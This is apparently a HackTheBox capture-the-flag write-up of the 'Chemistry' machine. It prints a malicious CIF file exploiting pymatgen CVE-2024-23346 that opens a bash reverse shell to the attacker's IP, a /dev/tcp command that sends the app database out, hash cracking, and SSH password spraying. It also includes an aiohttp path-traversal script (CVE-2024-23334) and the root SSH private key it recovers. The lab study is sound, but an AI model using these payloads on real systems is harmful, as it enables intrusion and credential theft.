---
render_with_liquid: false
title: HackTheBox Writeup  Chemistry
date: 2024-10-21 17:36:17 +1400
tags: [hackthebox, nmap, linux, feroxbuster, python, python-flask, cif, cif-parser, pymatgen, deserialization, cve-2024-23346, discover-secrets, sqlite, hashcat, password-spraying, netexec, port-forwarding, httpx, aiohttp, directory-traversal]
---



Chemistry is an easy-difficulty Linux machine that showcases a Remote Code Execution (RCE) vulnerability in the `pymatgen` (CVE-2024-23346) Python library by uploading a malicious `CIF` file to the hosted `CIF Analyzer` website on the target. After discovering and cracking hashes, we authenticate to the target via SSH as `rosa` user. For privilege escalation, we exploit a Path Traversal vulnerability that leads to an Arbitrary File Read in a Python library called `AioHTTP` (CVE-2024-23334) which is used on the web application running internally to read the root flag.

# Recon
---

## Nmap

```bash

# Nmap 7.94SVN scan initiated Mon Oct 21 17:36:16 2024 as: /usr/lib/nmap/nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,5000, 10.129.139.143
Nmap scan report for 10.129.139.143
Host is up, received user-set (0.28s latency).
Scanned at 2024-10-21 17:36:17 CST for 309s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCj5eCYeJYXEGT5pQjRRX4cRr4gHoLUb/riyLfCAQMf40a6IO3BMzwyr3OnfkqZDlr6o9tS69YKDE9ZkWk01vsDM/T1k/m1ooeOaTRhx2Yene9paJnck8Stw4yVWtcq6PPYJA3HxkKeKyAnIVuYBvaPNsm+K5+rsafUEc5FtyEGlEG0YRmyk/NepEFU6qz25S3oqLLgh9Ngz4oGeLudpXOhD4gN6aHnXXUHOXJgXdtY9EgNBfd8paWTnjtloAYi4+ccdMfxO7PcDOxt5SQan1siIkFq/uONyV+nldyS3lLOVUCHD7bXuPemHVWqD2/1pJWf+PRAasCXgcUV+Je4fyNnJwec1yRCbY3qtlBbNjHDJ4p5XmnIkoUm7hWXAquebykLUwj7vaJ/V6L19J4NN8HcBsgcrRlPvRjXz0A2VagJYZV+FVhgdURiIM4ZA7DMzv9RgJCU2tNC4EyvCTAe0rAM2wj0vwYPPEiHL+xXHGSvsoZrjYt1tGHDQvy8fto5RQU=
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLzrl552bgToHASFlKHFsDGrkffR/uYDMLjHOoueMB9HeLRFRvZV5ghoTM3Td9LImvcLsqD84b5n90qy3peebL0=
|   256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIELLgwg7A8Kh8AxmiUXeMe9h/wUnfdoruCJbWci81SSB
5000/tcp open  upnp?   syn-ack ttl 63
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.9.5
|     Date: Mon, 21 Oct 2024 09:36:27 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 719
|     Vary: Cookie
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Chemistry - Home</title>
|     <link rel="stylesheet" href="/static/styles.css">
|     </head>
|     <body>
|     <div class="container">
|     class="title">Chemistry CIF Analyzer</h1>
|     <p>Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.</p>
|     <div class="buttons">
|     <center><a href="/login" class="btn">Login</a>
|     href="/register" class="btn">Register</a></center>
|     </div>
|     </div>
|     </body>
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=9%D=10/21%Time=67162098%P=x86_64-pc-linux-gnu%
SF:r(GetRequest,38A,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.3
SF:\x20Python/3\.9\.5\r\nDate:\x20Mon,\x2021\x20Oct\x202024\x2009:36:27\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x20719\r\nVary:\x20Cookie\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20
SF:html>\n<html\x20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=
SF:\"UTF-8\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"wid
SF:th=device-width,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Chemi
SF:stry\x20-\x20Home</title>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\
SF:x20href=\"/static/styles\.css\">\n</head>\n<body>\n\x20\x20\x20\x20\n\x
SF:20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\n\x20\x20\x20\x20<div\x20class
SF:=\"container\">\n\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20class=\"title\"
SF:>Chemistry\x20CIF\x20Analyzer</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>
SF:Welcome\x20to\x20the\x20Chemistry\x20CIF\x20Analyzer\.\x20This\x20tool\
SF:x20allows\x20you\x20to\x20upload\x20a\x20CIF\x20\(Crystallographic\x20I
SF:nformation\x20File\)\x20and\x20analyze\x20the\x20structural\x20data\x20
SF:contained\x20within\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<div\x20clas
SF:s=\"buttons\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<center
SF:><a\x20href=\"/login\"\x20class=\"btn\">Login</a>\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20<a\x20href=\"/register\"\x20class=\"btn\">R
SF:egister</a></center>\n\x20\x20\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\
SF:x20\x20</div>\n</body>\n<")%r(RTSPRequest,1F4,"<!DOCTYPE\x20HTML\x20PUB
SF:LIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x
SF:20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"Con
SF:tent-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>
SF:\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20
SF:response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400
SF:</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20
SF:version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Er
SF:ror\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20r
SF:equest\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20\x20
SF:</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Mon Oct 21 17:41:26 2024 -- 1 IP address (1 host up) scanned in 309.44 seconds
```


## 80 - HTTP : Chemistry CIF Analyzer


### Info

```ruby
http://10.129.139.143:5000 [200] [Chemistry - Home] [Werkzeug/3.0.3 Python/3.9.5] [87254367f0aa9d122b994a5451766e290332b078] [Flask:3.0.3,Python:3.9.5]
```

![](/assets/obsidian/fbc049c6f4934c81624edadfbb107079.png)

### Directory

```bash
feroxbuster -w <(cat /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt|anew) -k --auto-tune -A -u "http://$(pt get rhost):5000" -o ferox_5000.txt
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Chemistry]
└─$ cat ferox_5000.txt | ff
200      GET      126l      277w     2312c http://10.129.139.143:5000/static/styles.css
200      GET       22l       61w      719c http://10.129.139.143:5000/
200      GET       29l       57w      926c http://10.129.139.143:5000/login
200      GET       29l       57w      931c http://10.129.139.143:5000/register
302      GET        5l       22w      229c http://10.129.139.143:5000/logout => http://10.129.139.143:5000/login?next=%2Flogout
302      GET        5l       22w      235c http://10.129.139.143:5000/dashboard => http://10.129.139.143:5000/login?next=%2Fdashboard
405      GET        5l       20w      153c http://10.129.139.143:5000/upload
```

# User Flag
---

## Shell as app


### 5000 - CIF parser : Enumeration

Register a user to access the `CIF (Crystallographic Information File) file parser` functionality

> http://10.129.139.143:5000/register

- Creds : `x:x`

![](/assets/obsidian/89d2e67a0554ab70791ae87f482bc079.png)

> http://10.129.139.143:5000/dashboard

![](/assets/obsidian/516b3bf71ddfb386458ee7f8eb0e289a.png)

The example CIF file is shown below

```bash
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1
```

After uploading the CIF file, it renders the analyze result in a web page

![](/assets/obsidian/4179a84d1617c3124777a4f5d132ec27.png)

![](/assets/obsidian/eaf4c1b894950d40b6e738c58bed1483.png)

> I've tried SSTI (it's likely a Flask application) and XSS but failed
{: .prompt-tip }


### 5000 - pymatgen : Unsafe deserialization (CVE-2024-23346)

Since there's no info about what the backend is using for CIF file parsing, it's better to google the gathered information and hope for the best

- Google : `python cif file parser vulnerability`

> Writeup + POC - https://ethicalhacking.uk/cve-2024-23346-arbitrary-code-execution-in-pymatgen-via-insecure/

> > Affected versions : Pymatgen versions prior to 2024.2.8 (inclusive)
> 
> The crux of the issue lies within the _JonesFaithfulTransformation.from_transformation_str()_ function. This function suffers from insecure deserialization due to its utilization of the _eval()_ method when processing user-supplied input. 
> 
> This inherently perilous practice allows an attacker to embed malicious code within a crafted string, which subsequently gets executed during the deserialization process.
{: .prompt-info }

I've modified the POC to make it ping my machine to check if execution was successful

> `test.cif`

```bash
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("ping 10.10.14.73");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

Start monitoring ICMP packet

```bash
┌──(bravosec㉿fsociety)-[~/htb/Chemistry]
└─$ sudo tcpdump -i tun0 -n icmp -v
```

Upload and view the `test.cif` file result

![](/assets/obsidian/705d467482bf81e9b88eba5178d2885a.png)

![](/assets/obsidian/17032add487620ff8b38d5a5833d8e14.png)

The execution was successful

```bash
┌──(bravosec㉿fsociety)-[~/htb/Chemistry]
└─$ sudo tcpdump -i tun0 -n icmp -v
tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
01:08:02.679210 IP (tos 0x0, ttl 63, id 26370, offset 0, flags [DF], proto ICMP (1), length 84)
    10.129.126.128 > 10.10.14.73: ICMP echo request, id 2, seq 1, length 64
```

Get a shell

> Some users have constrained path, provide full path to binaries is required
{: .prompt-info }

> `test.cif`

```bash
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'/bin/bash -i >& /dev/tcp/10.10.14.73/1111 0>&1\'");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Chemistry]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.73] from (UNKNOWN) [10.129.126.128] 55934
bash: cannot set terminal process group (1038): Inappropriate ioctl for device
bash: no job control in this shell
app@chemistry:~$ /usr/bin/script -qc /bin/bash /dev/null
/usr/bin/script -qc /bin/bash /dev/null^Z
zsh: suspended  nc -lvnp 1111

┌──(bravosec㉿fsociety)-[~/htb/Chemistry]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1111

                               app@chemistry:~$ export TERM=xterm
app@chemistry:~$ stty rows 50 columns 209
app@chemistry:~$ id
uid=1001(app) gid=1001(app) groups=1001(app)
```


## From app to rosa


### Harvesting - Sqlite database

The web app is using a sqlite database

```bash
app@chemistry:~$ ls -latr
total 56
-rw-r--r-- 1 app  app   807 Jun 15 20:43 .profile
-rw-r--r-- 1 app  app  3771 Jun 15 20:43 .bashrc
-rw-r--r-- 1 app  app   220 Jun 15 20:43 .bash_logout
drwx------ 7 app  app  4096 Jun 15 22:57 .local
drwxr-xr-x 4 root root 4096 Jun 16 23:10 ..
drwxrwxr-x 3 app  app  4096 Jun 17 00:44 .cache
lrwxrwxrwx 1 root root    9 Jun 17 01:51 .bash_history -> /dev/null
lrwxrwxrwx 1 root root    9 Jun 17 01:52 .sqlite_history -> /dev/null
-rw------- 1 app  app  5852 Oct  9 20:08 app.py
drwx------ 2 app  app  4096 Oct  9 20:13 static
drwx------ 2 app  app  4096 Oct  9 20:18 templates
drwxr-xr-x 9 app  app  4096 Oct 22 17:16 .
drwxr-xr-x 2 app  app  4096 Oct 22 17:16 .ssh
drwx------ 2 app  app  4096 Oct 22 19:04 instance
drwx------ 2 app  app  4096 Oct 22 19:15 uploads
```

```bash
app@chemistry:~$ ls -latr instance/
total 28
drwxr-xr-x 9 app app  4096 Oct 22 17:16 ..
-rwx------ 1 app app 20480 Oct 22 19:30 database.db
drwx------ 2 app app  4096 Oct 22 19:30 .
```

Transfer the database file to our attacker machine

```bash
┌──(bravosec㉿fsociety)-[~/htb/Chemistry]
└─$ nc -lvnp 444 > loot/database.db
listening on [any] 444 ...
```

```bash
app@chemistry:~$ cat instance/database.db > /dev/tcp/10.10.14.73/444
```

Browse the database

```bash
┌──(bravosec㉿fsociety)-[~/htb/Chemistry]
└─$ sqlite3 loot/database.db
SQLite version 3.46.0 2024-05-23 13:25:27
Enter ".help" for usage hints.
sqlite> .headers on
sqlite> .mode columns
sqlite> .tables
structure  user
sqlite> select * from user;
id  username  password
--  --------  --------------------------------
1   admin     2861debaf8d99436a10ed6f75a252abf
2   app       197865e46b878d9e74a0346b6d59886a
3   rosa      63ed86ee9f624c7b14f1d4f43dc251a5
4   robert    02fcf7cfc10adc37959fb21f06c6b467
5   jobert    3dec299e06f7ed187bac06bd3b670ab2
6   carlos    9ad48828b0955513f7cf0f7f6510c8f8
7   peter     6845c17d298d95aa942127bdad2ceb9b
8   victoria  c3601ad2286a4293868ec2a4bc606ba3
9   tania     a4aa55e816205dc0389591c9f82f43bb
10  eusebio   6cad48078d0241cca9a7b322ecd073b3
11  gelacia   4af70c80b68267012ecdac9a7e916d18
12  fabian    4e5d71f53fdd2eabdbabb233113b5dc0
13  axel      9347f9724ca083b17e39555c36fd9007
14  kristel   6896ba7b11a62cacffbdaded457c6d92
15  x         9dd4e461268c8034f5c8564e155c67a6
sqlite>
```

### Crack hashes

> `loot/database_user.log`

```bash
id  username  password
--  --------  --------------------------------
1   admin     2861debaf8d99436a10ed6f75a252abf
2   app       197865e46b878d9e74a0346b6d59886a
3   rosa      63ed86ee9f624c7b14f1d4f43dc251a5
4   robert    02fcf7cfc10adc37959fb21f06c6b467
5   jobert    3dec299e06f7ed187bac06bd3b670ab2
6   carlos    9ad48828b0955513f7cf0f7f6510c8f8
7   peter     6845c17d298d95aa942127bdad2ceb9b
8   victoria  c3601ad2286a4293868ec2a4bc606ba3
9   tania     a4aa55e816205dc0389591c9f82f43bb
10  eusebio   6cad48078d0241cca9a7b322ecd073b3
11  gelacia   4af70c80b68267012ecdac9a7e916d18
12  fabian    4e5d71f53fdd2eabdbabb233113b5dc0
13  axel      9347f9724ca083b17e39555c36fd9007
14  kristel   6896ba7b11a62cacffbdaded457c6d92
```

Extract username and hashes to another file with the format of `username:hash` per line

```bash
cat loot/database_user.log | tail -n +3 | awk '{print $2":"$3}' > loot/database_user.hash
```

Crack `loot/database_user.hash`

```bash
hashcat loot/database_user.hash /opt/wordlists/rockyou.txt --user -m 0
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Chemistry]
└─$ hashcat loot/database_user.hash /opt/wordlists/rockyou.txt --user -m 0 --show
rosa:63ed86ee9f624c7b14f1d4f43dc251a5:unicorniosrosados
carlos:9ad48828b0955513f7cf0f7f6510c8f8:carlos123
peter:6845c17d298d95aa942127bdad2ceb9b:peterparker
victoria:c3601ad2286a4293868ec2a4bc606ba3:victoria123
```

### 22 - SSH : Password spray

Extract users with shell

```bash
app@chemistry:~$ cat /etc/passwd|grep sh$
root:x:0:0:root:/root:/bin/bash
rosa:x:1000:1000:rosa:/home/rosa:/bin/bash
app:x:1001:1001:,,,:/home/app:/bin/bash
```

> `user.lst`

```bash
root
rosa
app
```

Extract the cracked passwords to a list

```bash
hashcat loot/database_user.hash /opt/wordlists/rockyou.txt --user -m 0 --show | awk -F: '{print $3}' > pass.lst
```

Spray passwords on all users

```bash
┌──(bravosec㉿fsociety)-[~/htb/Chemistry]
└─$ nxc ssh $(pt get rhost) -u user.lst -p pass.lst --continue-on-success --gfail-limit 3
SSH         10.129.126.128  22     10.129.126.128   [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.11
SSH         10.129.126.128  22     10.129.126.128   [-] root:unicorniosrosados
SSH         10.129.126.128  22     10.129.126.128   [+] rosa:unicorniosrosados  Linux - Shell access!
SSH         10.129.126.128  22     10.129.126.128   [-] app:unicorniosrosados
SSH         10.129.126.128  22     10.129.126.128   [-] root:carlos123
SSH         10.129.126.128  22     10.129.126.128   [-] app:carlos123
SSH         10.129.126.128  22     10.129.126.128   [-] root:peterparker
SSH         10.129.126.128  22     10.129.126.128   [-] app:peterparker
SSH         10.129.126.128  22     10.129.126.128   [-] root:victoria123
SSH         10.129.126.128  22     10.129.126.128   [-] app:victoria123
```

Successfully logged in as `rosa`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Chemistry]
└─$ cssh $(pt get rhost) rosa 'unicorniosrosados'
Warning: Permanently added '10.129.126.128' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-196-generic x86_64)
[...]
rosa@chemistry:~$ id
uid=1000(rosa) gid=1000(rosa) groups=1000(rosa)
rosa@chemistry:~$ cat user.txt
3d37412f98a8c58ec2ab98a09147b348
```

# Root Flag
---

## From rosa to root

### 8080 - Monitoring APP : Enumeration

- `8080` is listening on localhost

```bash
rosa@chemistry:~$ ss -ltnp
State                    Recv-Q                   Send-Q                                     Local Address:Port                                     Peer Address:Port                  Process
LISTEN                   0                        4096                                       127.0.0.53%lo:53                                            0.0.0.0:*
LISTEN                   0                        128                                              0.0.0.0:22                                            0.0.0.0:*
LISTEN                   0                        128                                              0.0.0.0:5000                                          0.0.0.0:*
LISTEN                   0                        128                                            127.0.0.1:8080                                          0.0.0.0:*
LISTEN                   0                        128                                                 [::]:22                                               [::]:*
```

- There's a monitoring site app running as root

```bash
rosa@chemistry:~$ ps auxfw5 | grep root
[...]
root        1039  0.1  1.8 339164 36776 ?        Ssl  11:25   0:58 /usr/bin/python3.9 /opt/monitoring_site/app.py
[...]
```

- The app directory is owned by root, but it's very likely the one running on port `8080`

```bash
rosa@chemistry:~$ ls -latr /opt/monitoring_site
ls: cannot open directory '/opt/monitoring_site': Permission denied
rosa@chemistry:~$ ls -latr /opt
total 12
drwxr-xr-x  3 root root 4096 Jun 16 00:01 .
drwx------  5 root root 4096 Oct  9 20:27 monitoring_site
drwxr-xr-x 19 root root 4096 Oct 11 11:17 ..
```

Local port forward from remote : `127.0.0.1:8080` to local `127.0.0.1:8081`

```bash
cssh $(pt get rhost) rosa 'unicorniosrosados' -L 8081:127.0.0.1:8080 -N
```

Identify web technology

```ruby
┌──(bravosec㉿fsociety)-[~/htb/Chemistry]
└─$ httpx -random-agent -td -server -title -fr -sc -hash sha1 -silent -ss -timeout 20 -srd httpx_local -u 'http://127.0.0.1:8081'
http://127.0.0.1:8081 [200] [Site Monitoring] [Python/3.9 aiohttp/3.9.1] [ad8c0e168a2aa899267295e06816725fd81969ff] [Chart.js,Python:3.9,jQuery]
```

Enumerate web directory from external

```bash
┌──(bravosec㉿fsociety)-[~/htb/Chemistry]
└─$ feroxbuster -w /usr/share/seclists/Fuzzing/fuzz-Bo0oM.txt -C 404,400,500 -k --auto-tune -A --dont-scan /server-status/ -u "http://127.0.0.1:8081" -o ferox_8080_fuzz.txt
[...]
200      GET        2l     1294w    89501c http://127.0.0.1:8081/assets/js/jquery-3.6.0.min.js
200      GET       88l      171w     1380c http://127.0.0.1:8081/assets/css/style.css
200      GET        5l       83w    59344c http://127.0.0.1:8081/assets/css/all.min.css
200      GET       72l      171w     2491c http://127.0.0.1:8081/assets/js/script.js
200      GET       20l     3036w   205637c http://127.0.0.1:8081/assets/js/chart.js
200      GET      153l      407w     5971c http://127.0.0.1:8081/
[...]
```


### 8080 - aiohttp 3.9.1 : Directory traversal (CVE-2024-23334)

- Google : `aiohttp 3.9.1 exploit`

> POC - https://github.com/z3rObyte/CVE-2024-23334-PoC

- The exploit uses a for loop between `0 ~ 14` times of the traversal string `..` to check if `<BASE_URL>/<STATIC_FILES_DIR>/<TRAVERSAL_STRING>/etc/passwd` is valid

> `exploit.sh`

```bash

#!/bin/bash

url="http://localhost:8081"
string="../"
payload="/static/"
file="etc/passwd" # without the first /

for ((i=0; i<15; i++)); do
    payload+="$string"
    echo "[+] Testing with $payload$file"
    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
    echo -e "\tStatus code --> $status_code"
    
    if [[ $status_code -eq 200 ]]; then
        curl -s --path-as-is "$url$payload$file"
        break
    fi
done
```

I already know that the app locates at `/opt/monitoring_site`, and the static files' directory name is `assets` (From web enumeration)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Chemistry]
└─$ curl --path-as-is -s 'http://127.0.0.1:8081/assets/../../../etc/passwd'
root:x:0:0:root:/root:/bin/bash
[...]
```

Get root's private key

```bash
┌──(bravosec㉿fsociety)-[~/htb/Chemistry]
└─$ curl --path-as-is -s 'http://127.0.0.1:8081/assets/../../../root/.ssh/id_rsa' | tee root.id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

SSH as root with the private key

```bash
┌──(bravosec㉿fsociety)-[~/htb/Chemistry]
└─$ ssh -i root.id_rsa root@$(pt get rhost)
[...]
root@chemistry:~# id
uid=0(root) gid=0(root) groups=0(root)
root@chemistry:~# cat root.txt
f93a3a2f95e7f5642e30c4f776ae394c
```


# Additional
---
